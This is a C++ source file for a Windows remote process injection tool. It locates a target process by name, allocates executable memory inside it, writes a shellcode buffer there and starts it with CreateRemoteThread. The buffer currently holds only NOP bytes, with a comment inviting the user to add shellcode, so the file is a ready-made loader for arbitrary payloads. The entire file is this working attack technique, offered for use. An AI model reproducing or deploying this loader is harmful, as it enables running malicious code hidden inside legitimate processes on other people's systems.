#include <Windows.h>
#include <tlhelp32.h>
#include <iostream>


unsigned char shellcode[] = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 }; // Add your shellcode here


DWORD FindProcessID(const std::wstring& pName)
{
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;
    DWORD processID = 0;

    // Take a snapshot of all processes in the system.
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE)
    {
        std::cerr << "CreateToolhelp32Snapshot (of processes) failed." << std::endl;
        return 0;
    }

    // Set the size of the structure before using it.
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Retrieve information about the first process,
    if (!Process32First(hProcessSnap, &pe32))
    {
        std::cerr << "Process32First failed." << std::endl;
        CloseHandle(hProcessSnap);          // Clean the snapshot object
        return 0;
    }

    do
    {
        if (pName == pe32.szExeFile)
        {
            processID = pe32.th32ProcessID;
            break;
        }
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
    return processID;
}

void InjectShellCode(DWORD processID, unsigned char* shellcode, size_t shellcodeSize)
{
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
    if (hProcess == NULL)
    {
        std::cerr << "OpenProcess failed." << std::endl;
        return;
    }

    LPVOID pRemotebuffer = VirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (pRemotebuffer == NULL)
    {
        std::cerr << "VirtualAllocEx Failed." << std::endl;
        CloseHandle(hProcess);
        return;
    }

    BOOL wroteMemory = WriteProcessMemory(hProcess, pRemotebuffer, shellcode, shellcodeSize, NULL);
    if (!wroteMemory)
    {
        std::cerr << "WriteProcessMemory Failed." << std::endl;
        VirtualFreeEx(hProcess, pRemotebuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemotebuffer, NULL, 0, NULL);
    if (hThread == NULL)
    {
        std::cerr << "CreateRemoteThreadFailed." << std::endl;
        VirtualFreeEx(hProcess, pRemotebuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    WaitForSingleObject(hThread, INFINITE);
    VirtualFreeEx(hProcess, pRemotebuffer, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);
}



int main(int argc, char* argv[])
{
    if (argc != 2)
    {
        std::cerr << "[*] Usage: Remote_Process_Injection.exe <Process Name> " << std::endl;
        return 1;
    }

    std::wstring pName = std::wstring(argv[1], argv[1] + strlen(argv[1]));  // Convert the process name to a wide string

    DWORD processID = FindProcessID(pName);   // PID Function Call

    if (processID != 0)
    {
        InjectShellCode(processID, shellcode, sizeof(shellcode));
    }
    else
    {
        std::cerr << "Process Not Found." << std::endl;
    }

    return 0;
}
